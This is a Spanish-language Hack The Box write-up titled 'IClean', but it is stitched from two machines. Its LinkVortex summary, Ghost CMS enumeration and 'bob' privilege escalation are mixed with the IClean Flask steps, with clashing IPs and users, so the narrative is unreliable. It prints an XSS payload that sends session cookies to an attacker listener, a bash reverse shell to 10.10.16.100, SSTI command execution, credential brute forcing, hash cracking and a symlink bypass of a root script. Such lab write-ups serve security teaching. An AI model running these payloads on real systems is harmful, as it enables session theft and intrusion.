---
layout: single
title: Hack The Box - IClean
excerpt: "LinkVortex es una máquina de dificultad baja en la plataforma Hack The Box. En esta máquina se explota el CMS Ghost a través de la vulnerabilidad CVE-2023-40028. Para aprovechar esta vulnerabilidad, primero deben identificarse credenciales válidas, las cuales se obtienen desde un archivo `.git` expuesto en el servidor, una enumeración de usuarios en el login facilita la validación de cuentas existentes, lo que complementa la obtención de credenciales. Para la escalación de privilegios, se abusa de un script automatizado utilizando enlaces simbólicos, engañando al servidor logrando obtener archivos la llave ssh del usuario root."
date: 2024-08-21
classes: wide
header:
  teaser: /assets/images/htb-writeup-IClean/IClean.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hackthebox
  - Web Pentesting
tags:  
  - XSS
  - SSTI
---


<style>
body
{
  margin: 0;
  padding: 0;
}

.glitch
  {
    position: relative;
    width: 50%;
    height: 50vh;
    background-image:url("/assets/images/htb-writeup-IClean/IClean.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
 }

.glitch:before
  {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url("/assets/images/htb-writeup-IClean/IClean.png");
    background-size: cover; /* contain for split effect */
    opacity: .5;
    mix-blend-mode: hard-light;
    animation: glitch2 10s linear infinite;
  }

.glitch:hover:before
{
  animation: glitch1 1s linear infinite;
}

@keyframes glitch1
{
  0%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  10%
  {
    background-position: 5px 0;
  }
  20%
  {
    background-position: -5px 0;
  }
  30%
  {
    background-position: 15px 0;
  }
  40%
  {
    background-position: -5px 0;
  }
  50%
  {
    background-position: -25px 0;
  }
  60%
  {
    background-position: -50px 0;
  }
  70%
  {
    background-position: 0 -20px;
  }
  80%
  {
    background-position: -60px -20px;
  }
  81%
  {
    background-position: 0 0;
  }
  100%
  {
    background-position: 0 0;
    filter: hue-rotate(360deg);
  }
}

@keyframes glitch2
{
  0%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  10%
  {
    background-position: 15px 0;
  }
  15%
  {
    background-position: -15px 0;
  }
  20%
  {
    filter: hue-rotate(360deg);
  }
  25%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  100%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
}

@media (max-width: 767.5px) {

.glitch{
position: relative;
    width: 50%;
    height: 50vh;
    background-image:url("/assets/images/htb-writeup-IClean/IClean.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
}
}


@media (max-width: 575.5px) { 

.glitch{
position: relative;
    width: 50%;
    height: 25vh;
    background-image:url("/assets/images/htb-writeup-IClean/IClean.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
}
}


</style>
<body>
    <div class="glitch">  
    </div>
</body>

<br>

LinkVortex es una máquina de dificultad baja en la plataforma Hack The Box. En esta máquina se explota el CMS Ghost a través de la vulnerabilidad **CVE-2023-40028. Para aprovechar esta vulnerabilidad, primero deben identificarse credenciales válidas, las cuales se obtienen desde un archivo `.git` expuesto en el servidor, una enumeración de usuarios en el login facilita la validación de cuentas existentes, lo que complementa la obtención de credenciales. Para la escalación de privilegios, se abusa de un script automatizado utilizando enlaces simbólicos, engañando al servidor logrando obtener archivos la llave ssh del usuario root.
## Enumeración
Realicé un escaneo de puertos con la herramienta **Nmap** e identifiqué los siguientes puertos abiertos:<br>
- 22 SSH
- 80 HTTP 

```bash
Nmap scan report for 10.10.11.47
Host is up, received user-set (0.11s latency).
Scanned at 2025-04-02 12:52:49 EDT for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Realicé un nuevo escaneo con **Nmap** utilizando la opción `-sVC` para obtener información detallada de los servicios detectados, y logré identificar el dominio: **linkvortex.htb**.

```bash
Nmap scan report for 10.10.11.47
Host is up, received user-set (0.11s latency).
Scanned at 2025-04-02 12:54:04 EDT for 10s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
80/tcp open  http    syn-ack ttl 63 Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Posteriormente, agregué el dominio al archivo **/etc/hosts**, apuntándolo a la IP de la máquina víctima para poder visualizar correctamente la página web.

```bash
┌──(root㉿kali)-[/home/kali]
└─# cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.47     linkvortex.htb 
```

## Enumeración Web

El sitio web que estaba alojado en la máquina era el siguiente:

![](/assets/images/htb-writeup-LinkVortex/host.png)

Utilicé **Wappalyzer** para obtener más información sobre las tecnologías implementadas en el sitio web, y detecté que utiliza el CMS **Ghost** en su versión **5.58**.

![](/assets/images/htb-writeup-LinkVortex/web2.png)

Al revisar la página manualmente, no identifiqué ningún recurso o funcionalidad interesante, por lo que realicé un escaneo de directorios, en el cual encontré el típico archivo **robots.txt**.

```bash
  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                             
 (_||| _) (/_(_|| (_| )                                                                                                                                      
                                                                                                                                                             
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_linkvortex.htb/__25-04-02_13-04-49.txt

Target: http://linkvortex.htb/

[13:04:50] Starting:                                                                                                                                         
[13:05:22] 301 -  179B  - /assets  ->  /assets/                             
[13:05:23] 301 -    0B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp/    
[13:05:23] 301 -    0B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp/
[13:05:23] 301 -    0B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp/
[13:05:26] 301 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js/
[13:05:32] 301 -    0B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf/
[13:05:32] 301 -    0B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf/
[13:05:33] 301 -    0B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf/
[13:05:33] 200 -   15KB - /favicon.ico                                      
[13:05:37] 301 -    0B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf/
[13:05:40] 200 -    1KB - /LICENSE                                          
[13:05:57] 200 -  103B  - /robots.txt                                       
[13:05:58] 403 -  199B  - /server-status                                    
[13:05:58] 403 -  199B  - /server-status/
[13:06:01] 200 -  257B  - /sitemap.xml                                      
                                                                             
Task Completed                        
```

![](/assets/images/htb-writeup-IClean/LinkVortex.png)

Al revisar el directorio **/ghost**, observé que se trata del panel de inicio de sesión para la administración del CMS.

![](/assets/images/htb-writeup-LinkVortex/login.png)

Además de este recurso, no identifiqué ningún otro que pudiera servirme como punto de entrada, así que realicé una búsqueda de virtual hosts con **ffuf** y logré identificar uno adicional.

```bash
┌──(root㉿kali)-[/home/kali]
└─# ffuf -w /opt/subdomains-top1million-5000.txt:FUZZ -u http://linkvortex.htb/ -H 'Host: FUZZ.linkvortex.htb' -fs 230

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb/
 :: Wordlist         : FUZZ: /opt/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 230
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 112ms]
:: Progress: [4989/4989] :: Job [1/1] :: 386 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

Agregué este nuevo dominio al archivo **/etc/hosts** y, al revisarlo en el navegador, observé un sitio web diferente.

![](/assets/images/htb-writeup-LinkVortex/web2.png)

Realicé otro escaneo con **dirsearch** en este nuevo portal web e identifiqué lo siguiente:


```bash
  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                             
 (_||| _) (/_(_|| (_| )                                                                                                                                      
                                                                                                                                                             
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_dev.linkvortex.htb/__25-04-02_13-34-53.txt

Target: http://dev.linkvortex.htb/

[13:34:53] Starting:                                                                                                                                         
[13:34:56] 301 -  239B  - /.git  ->  http://dev.linkvortex.htb/.git/        
[13:34:56] 200 -  557B  - /.git/                                            
[13:34:56] 200 -  201B  - /.git/config                                      
[13:34:56] 200 -   73B  - /.git/description
[13:34:56] 200 -   41B  - /.git/HEAD                                        
[13:34:56] 200 -  620B  - /.git/hooks/                                      
[13:34:56] 200 -  402B  - /.git/info/                                       
[13:34:56] 200 -  401B  - /.git/logs/                                       
[13:34:56] 200 -  240B  - /.git/info/exclude
[13:34:56] 200 -  175B  - /.git/logs/HEAD                                   
[13:34:56] 200 -  418B  - /.git/objects/                                    
[13:34:56] 200 -  147B  - /.git/packed-refs                                 
[13:34:56] 200 -  393B  - /.git/refs/                                       
[13:34:56] 301 -  249B  - /.git/refs/tags  ->  http://dev.linkvortex.htb/.git/refs/tags/
[13:34:57] 403 -  199B  - /.ht_wsr.txt                                      
[13:34:57] 403 -  199B  - /.htaccess.bak1                                   
[13:34:57] 200 -  691KB - /.git/index                                       
[13:34:57] 403 -  199B  - /.htaccess.orig
[13:34:57] 403 -  199B  - /.htaccessBAK                                     
[13:34:57] 403 -  199B  - /.htaccess_extra
[13:34:57] 403 -  199B  - /.htm
[13:34:57] 403 -  199B  - /.htaccess_orig
[13:34:57] 403 -  199B  - /.htaccess.sample                                 
[13:34:57] 403 -  199B  - /.html
[13:34:57] 403 -  199B  - /.htaccessOLD                                     
[13:34:57] 403 -  199B  - /.htaccess_sc
[13:34:57] 403 -  199B  - /.htaccess.save                                   
[13:34:57] 403 -  199B  - /.htpasswds                                       
[13:34:57] 403 -  199B  - /.htaccessOLD2                                    
[13:34:57] 403 -  199B  - /.htpasswd_test
[13:34:57] 403 -  199B  - /.httr-oauth                                      
[13:35:22] 403 -  199B  - /cgi-bin/                                         
[13:35:50] 403 -  199B  - /server-status/                                   
[13:35:50] 403 -  199B  - /server-status                                    
                                                                             
Task Completed       
```

Al observar que el sitio contenía un archivo **.git**, utilicé **git-dumper** para descargar todo el proyecto

```bash
┌──(root㉿kali)-[/opt/git-dumper]
└─# ./git_dumper.py http://dev.linkvortex.htb/ linkvortex
/opt/git-dumper/./git_dumper.py:409: SyntaxWarning: invalid escape sequence '\g'
  modified_content = re.sub(UNSAFE, '# \g<0>', content, flags=re.IGNORECASE)
[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.git/ [200]
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/description [200]
[-] Fetching http://dev.linkvortex.htb/.git/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/config [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/shallow [200]
[-] Fetching http://dev.linkvortex.htb/.git/index [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/packed-refs [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/exclude [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/v5.57.3 [200]
```

Después de explorar los directorios del proyecto, realicé una búsqueda recursiva utilizando palabras clave específicas, con el objetivo de identificar información sensible o credenciales potenciales. Algunas de las palabras clave que utilicé fueron:

```bash
grep -Ri "password"
grep -Ri "password:"
grep -Ri "password ="
```

Con esta búsqueda identifiqué varias contraseñas, las cuales fui almacenando en un archivo de texto para su posterior análisis y prueba.

```bash
ghost/core/test/regression/models/model_users.test.js:                    newPassword: '1234567890',
ghost/core/test/regression/models/model_users.test.js:                    ne2Password: '1234567890',
ghost/core/test/regression/models/model_users.test.js:                    oldPassword: '123456789',
ghost/core/test/regression/models/model_users.test.js:                    newPassword: '12345678',
ghost/core/test/regression/models/model_users.test.js:                    ne2Password: '12345678',
ghost/core/test/regression/models/model_users.test.js:                    oldPassword: 'Sl1m3rson99',
ghost/core/test/regression/models/model_users.test.js:                    newPassword: '1234567890',
ghost/core/test/regression/models/model_users.test.js:                    ne2Password: '1234567890',
ghost/core/test/regression/models/model_users.test.js:                    oldPassword: 'Sl1m3rson99',
ghost/core/test/regression/models/model_users.test.js:                    newPassword: 'jbloggs@example.com',
ghost/core/test/regression/models/model_users.test.js:                    ne2Password: 'jbloggs@example.com',
ghost/core/test/regression/models/model_users.test.js:                    oldPassword: 'Sl1m3rson99',
ghost/core/test/regression/models/model_users.test.js:                    newPassword: 'onepassword',
ghost/core/test/regression/models/model_users.test.js:                    ne2Password: 'onepassword',
ghost/core/test/regression/models/model_users.test.js:                    oldPassword: 'Sl1m3rson99',
ghost/core/test/regression/models/model_users.test.js:                    newPassword: '127.0.0.1:2369',
ghost/core/test/regression/models/model_users.test.js:                    ne2Password: '127.0.0.1:2369',
ghost/core/test/regression/models/model_users.test.js:                    oldPassword: 'Sl1m3rson99',
ghost/core/test/regression/models/model_users.test.js:                    newPassword: 'cdcdcdcdcd',
ghost/core/test/regression/models/model_users.test.js:                    ne2Password: 'cdcdcdcdcd',
ghost/core/test/regression/models/model_users.test.js:                    oldPassword: 'Sl1m3rson99',
ghost/core/test/regression/models/model_users.test.js:                    newPassword: '1231111111',
ghost/core/test/regression/models/model_users.test.js:                    ne2Password: '1231111111',
ghost/core/test/regression/models/model_users.test.js:                    oldPassword: 'Sl1m3rson99',
ghost/core/test/regression/models/model_users.test.js:                password: 'thisissupersafe'
```

También logré identificar algunos posibles usuarios, los cuales intenté verificar en la página web aprovechando que el servidor permite la enumeración de usuarios a través de los mensajes de error. Sin embargo, ninguno de los usuarios encontrados en el repositorio resultó ser válido. Por ello, decidí probar con el correo **admin@linkvortex.htb**, y pude confirmar que este usuario sí existe.


![](/assets/images/htb-writeup-LinkVortex/enumuser.png)

Realicé un ataque con **Intruder** de **BurpSuite**, logré identificar la contraseña asociada al usuario: **OctopiFociPilfer45**


![](/assets/images/htb-writeup-LinkVortex/burp.png)

![](/assets/images/htb-writeup-LinkVortex/dash.png)




Al revisar el sitio web de la máquina, obtuve el siguiente error. Para solucionarlo, añadí el dominio `capiclean.htb` a mi archivo `/etc/hosts`, lo que me permitió visualizar la página correctamente.

![](/assets/images/htb-writeup-IClean/host.png)

```bash
┌──(root㉿kali)-[/home/kali]
└─# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.12     capiclean.htb
```
![](/assets/images/htb-writeup-IClean/web1.png)

Para obtener más información acerca de las tecnologías empleadas en el sitio web utilicé la wappalyzer.

![](/assets/images/htb-writeup-IClean/web2.png)

Veo que están utilizando Flask, lo cual podría indicar una vulnerabilidad de SSTI (Server-Side Template Injection). Realizando un escaneo de directorios con Dirsearch, identifique los siguientes: 

```bash
┌──(root㉿kali)-[/opt]
└─# dirsearch -u 'http://capiclean.htb/'               
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /opt/reports/http_capiclean.htb/__24-07-01_13-55-29.txt

Target: http://capiclean.htb/

[13:55:29] Starting: 
[13:55:47] 200 -    5KB - /about                                            
[13:56:18] 302 -  189B  - /dashboard  ->  /                                 
[13:56:39] 200 -    2KB - /login                                            
[13:56:40] 302 -  189B  - /logout  ->  /                                    
[13:57:02] 403 -  278B  - /server-status                                    
[13:57:02] 403 -  278B  - /server-status/                                   
[13:57:03] 200 -    8KB - /services                                         

Task Completed    
```

Examinando manualmente el sitio web, identifiqué una página donde se puede enviar una solicitud de cotización. Parece que es la única funcionalidad del sitio, además del login.


![](/assets/images/htb-writeup-IClean/web3.png)

Intercepta la solicitud con Burp y después de realizar algunas pruebas me di cuenta que es vulnerable a Cross-Site Scripting Blind en el campo `service`.


![](/assets/images/htb-writeup-IClean/burp.png)

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 80   
listening on [any] 80 ...
connect to [10.10.16.100] from (UNKNOWN) [10.10.11.12] 58812
GET / HTTP/1.1
Host: 10.10.16.100
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: */*
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

Para capturar la cookie, utilicé el siguiente payload codificado en URL:

```html
<img src=x onerror=document.location="http://10.10.16.100/xss-75.js?c="+document.cookie>
```

![](/assets/images/htb-writeup-IClean/burp2.png)

```bash
┌──(root㉿kali)-[/opt]
└─# nc -lvnp 80              
listening on [any] 80 ...
connect to [10.10.16.100] from (UNKNOWN) [10.10.11.12] 33764
GET /xss-75.js?c=session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZoJ-cQ.ue-npu2ARF9jBsm2mP8niqHN4vo HTTP/1.1
Host: 10.10.16.100
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

Ahora que tengo la cookie, abrí el inspector, la añadí  y accedí a la ruta dashboard identificada anteriormente, logrando ingresar al panel de administración del sitio web.


![](/assets/images/htb-writeup-IClean/cook.png)


![](/assets/images/htb-writeup-IClean/dashboard.png)

Una vez dentro del panel de administración, revisé manualmente todas las funcionalidades, probando payloads de SSTI debido al uso de Flask. En la opción para generar un QR, identifiqué un parámetro vulnerable. 


![](/assets/images/htb-writeup-IClean/stti.png)

Después intenté enviar un payload para ejecutar comandos, pero recibí un error del servidor, lo que sugiere que algunos caracteres podrían estar bloqueados.


![](/assets/images/htb-writeup-IClean/bburp.png)

Para lograr la ejecución remota de comandos utilice el sig. payload en el cual se realizan algunos bypass de caracteres como `.` y `_`

![](/assets/images/htb-writeup-IClean/payload.png)

Referencia: [HackMD](https://hackmd.io/@Chivato/HyWsJ31dI)

![](/assets/images/htb-writeup-IClean/burp3.png)

Para poder generar una reverse shell cree un archivo con el sig. contenido:

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.100/443 0>&1
```

Posteriormente coloque un servidor temporal y llame mi archivo para que también se ejecutará y me regresara la shell


![](/assets/images/htb-writeup-IClean/burp4.png)

```bash
┌──(root㉿kali)-[/tmp]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.12 - - [01/Jul/2024 17:25:54] "GET /r HTTP/1.1" 200 -
```

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 443
listening on [any] 443 ...
connect to [10.10.16.100] from capiclean.htb [10.10.11.12] 54024
bash: cannot set terminal process group (1237): Inappropriate ioctl for device
bash: no job control in this shell
www-data@iclean:/opt/app$ whoami
whoami
www-data
www-data@iclean:/opt/app$ 
```

Para trabajar mas cómodo realice un tratamiento de la TTY

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 443
listening on [any] 443 ...
connect to [10.10.16.100] from capiclean.htb [10.10.11.12] 60878
bash: cannot set terminal process group (1228): Inappropriate ioctl for device
bash: no job control in this shell
www-data@iclean:/opt/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@iclean:/opt/app$ ^Z
zsh: suspended  nc -lvp 443                                                                                                                         
┌──(root㉿kali)-[/home/kali]
└─# stty raw -echo; fg
[1]  + continued  nc -lvp 443
                                reset
www-data@iclean:/opt/app$ export TERM=xterm
www-data@iclean:/opt/app$ export SHELL=bash
```

Dentro del directorio donde obtuve la shell, hay un script en Python que contiene credenciales para iniciar sesión en MySQL

```bash
www-data@iclean:/opt/app$ cat app.py 
from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
from flask import render_template_string
import pymysql
import hashlib
import os
import random, string
import pyqrcode
from jinja2 import StrictUndefined
from io import BytesIO
import re, requests, base64

app = Flask(__name__)

app.config['SESSION_COOKIE_HTTPONLY'] = False

secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
app.secret_key = secret_key
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}

app._static_folder = os.path.abspath("/opt/app/static/")
```

Probé estas credenciales con el usuario de la máquina (consuela), pero no funcionaron. Entonces, inicié sesión en MySQL y, al enumerar la base de datos, identifiqué el hash de la contraseña del usuario.

```bash
www-data@iclean:/opt/app$ mysql -u iclean -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 200
Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use capiclean;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.00 sec)

mysql> select * from users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
2 rows in set (0.00 sec)

mysql> 
```

Identifiqué que el hash de la contraseña del usuario es SHA-256, así que pude romperlo con John y luego iniciar sesión mediante SSH.


![](/assets/images/htb-writeup-IClean/hash.png)

```bash
┌──(root㉿kali)-[/home/kali]
└─# john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt creds.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
simple and clean (?)     
1g 0:00:00:00 DONE (2024-07-01 18:51) 1.960g/s 7388Kp/s 7388Kc/s 7388KC/s sisqosgirl..sidneyMC03
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed. 
```

```bash
┌──(root㉿kali)-[/home/kali]
└─# ssh consuela@10.10.11.12
consuela@10.10.11.12's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Mon Jul  1 10:52:13 PM UTC 2024




Expanded Security Maintenance for Applications is not enabled.

3 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
consuela@iclean:~$ whoami
consuela
```

## Escalada de privilegios

Ejecutando **sudo -l**, pude ver que puedo ejecutar el script /opt/ghost/clean_symlink.sh como root sin necesidad de proporcionar contraseña.

```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
bob@linkvortex:~$ 
```

El contenido del archivo **clean_symlink.sh** es el siguiente:

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

El script estaba diseñado para mover a una carpeta de cuarentena (`/var/quarantined`) cualquier **enlace simbólico que terminara en `.png`**. Si la variable `CHECK_CONTENT=true` estaba activada, el script mostraba el contenido del archivo al que apuntaba el symlink. Sin embargo, si el enlace apuntaba a una ruta que incluyera las palabras **`etc`** o **`root`**, este era eliminado automáticamente por considerarse peligroso.

Para lograr engañarlo y hacer que muestre el contenido de **/root/root.txt**  seguí los siguientes pasos:

1. Cree un enlace simbólico con terminación .png que apunte a /root/root.txt: **ln -s /root/root.txt /tmp/safe/data.txt **
2. Cree otro enlace simbólico que apunte a mi enlace simbólico anterior de este modo cuando el script revisa `readlink` y busca `etc|root` en el contenido al no encontrarlo lo toma como bueno: **ln -s /tmp/safe/data.txt p3rr1n.png** 

